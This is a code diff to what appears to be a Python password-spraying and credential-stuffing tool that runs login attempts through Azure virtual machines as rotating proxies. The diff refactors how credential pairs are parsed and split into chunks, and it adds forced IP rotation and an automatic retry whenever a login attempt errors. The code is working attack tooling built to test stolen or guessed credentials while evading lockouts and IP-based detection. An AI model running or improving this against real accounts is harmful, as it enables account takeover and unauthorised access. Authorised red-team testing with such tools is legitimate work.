@@ -2,7 +2,6 @@ import sys
 from . import aws, rotate_ip_if_needed
 from datetime import datetime, timedelta
 import pause
-from multiprocessing import Process, Queue
 import os
 import toml
 import importlib.resources
@@ -10,6 +9,8 @@ from . import azure_proxy, update, attempt_login, create_selray_vm, delete_vm_by
 import subprocess
 from pathlib import Path
 from importlib import resources as importlib_resources
+
+from .credential_stuffing import assign_spray_identifier
 
 
 class Colors:
@@ -29,6 +30,7 @@ def alternate_modes(args):
         destroy_proxies(args)
         exit()
     elif args.proxy_list:
+        print("Getting list of proxies...\n")
         list_proxies(args)
         exit()
     elif args.update:
@@ -259,72 +261,57 @@ def perform_spray(spray_config, credentials, queue):
         #   - PASSWORD
         #   - RESULT: one of ["INVALID USERNAME", "LOCKED", "PASSWORDLESS", "VALID USERNAME", "ERROR", "SUCCESS", "FAILURE"]
         result = attempt_login.main(spray_config, vm_url)
-        results.append(result)
 
         if spray_config.azure:
-            spray_num_with_current_ip, new_ip, new_url, _ = rotate_ip_if_needed(spray_config.azure_resource_group,
-                                                                         vm_name,
-                                                                         spray_config.num_sprays_per_ip,
-                                                                         spray_num_with_current_ip,
-                                                                         network_client,
-                                                                         compute_client,
-                                                                         nic_name,
-                                                                         spray_config.azure_location)
+            # If an error was returned, force a proxy IP change
+            if result.get("RESULT") == "ERROR":
+                spray_num_with_current_ip = 10000
 
+            # Force rotate on navigation/proxy errors to recover quickly.
+            spray_num_with_current_ip, new_ip, new_url, _ = rotate_ip_if_needed(
+                spray_config.azure_resource_group,
+                vm_name,
+                spray_config.num_sprays_per_ip,
+                spray_num_with_current_ip,
+                network_client,
+                compute_client,
+                nic_name,
+                spray_config.azure_location,
+            )
+
+            # rotate_ip_if_needed can return null urls and ips, so this just ensures we don't set them to null
             if new_url:
                 vm_url = new_url
             if new_ip:
                 vm_ip = new_ip
 
+            # If an error was encountered, try to log in again
+            if result.get("RESULT") == "ERROR":
+                result = attempt_login.main(spray_config, vm_url)
+
+        results.append(result)
+
     queue.put(results)
     delete_vm_by_name(spray_config.azure_resource_group, vm_name)
 
 
-def credential_stuffing(spray_config, args, proxies):
-    credentials = []
+def credential_stuffing(spray_config, args):
+    from . import credential_stuffing
+    from .spray import launch_spray_processes
     results = []
-    for credential in args.usernames:
-        username = credential.split(":")[0]
-        password = credential.split(":")[1]
-        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})
 
-    # Assign unique spray identifier
-    from collections import defaultdict
-    user_groups = defaultdict(list)
-    for d in credentials:
-        user_groups[d['USERNAME']].append(d)
-    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
-        for index, d in enumerate(group, start=1):
-            d['ATTEMPT'] = index
-    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list
+    credentials = credential_stuffing.split_username_password(args.usernames)
+    credentials = credential_stuffing.assign_spray_identifier(credentials)
 
     stuffing_attempt = 1
     num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
+
     while stuffing_attempt <= num_stuffing_attempts:
         next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
         print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")
 
-        credentials_to_spray = []
-        for credential in credentials:
-            if credential['ATTEMPT'] == stuffing_attempt:
-                credentials_to_spray.append(credential)
-
-        chunk_size = (len(credentials_to_spray) + len(proxies) - 1) // len(proxies)
-        user_chunks = [credentials_to_spray[i:i + chunk_size] for i in
-                       range(0, len(credentials_to_spray), chunk_size)]
-
-        processes = []
-        queue = Queue()
-        for proxy, user_chunk in zip(proxies, user_chunks):
-            p = Process(target=perform_spray, args=(spray_config, user_chunk, proxy, queue))
-            p.start()
-            processes.append(p)
-
-        for p in processes:
-            p.join()
-
-        while not queue.empty():
-            results.extend(queue.get())
+        user_chunks = credential_stuffing.split_users_into_chunks(credentials, stuffing_attempt, args.threads)
+        results.extend(launch_spray_processes(spray_config, user_chunks))
 
         # Check to see if the process is at the end. If not, wait the specified time.
         if stuffing_attempt < num_stuffing_attempts:
